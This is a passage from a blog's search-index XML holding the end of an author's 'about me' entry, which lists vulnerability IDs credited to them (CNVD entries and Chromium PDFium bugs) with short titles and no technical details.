CNVD-2022-00040, CNVD-2022-00041,CNVD-2022-00042, CNVD-2022-00043, CNVD-2022-00044, CNVD-2022-00045,CNVD-2022-00046, CNVD-2022-00047, CNVD-2022-00048</strong> UncontrolledResource Consumption in suwellofdapp.exe</li><li><strong>CNVD-2022-00049</strong> : Arbitrary Address Access inswd20.dll</li></ul><p><strong>Year – 2022</strong></p><p><strong>Chromium:</strong></p><ul><li><p><strong>Issue 1312736, Issue 1327884</strong> : null-dereferencein PDFium</p></li><li><p><strong>Issue 1314658</strong> : heap-use-after-free in PDFiumCPDFSDK_AppStream::Write</p></li></ul><hr /><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/Mundi-Xu/main/blog-metrics.svg" /></p>]]></content>
    
    
    <categories>
      
      <category>Life &amp; Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLM Security</tag>
      
      <tag>System Security</tag>
      
      <tag>about me</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
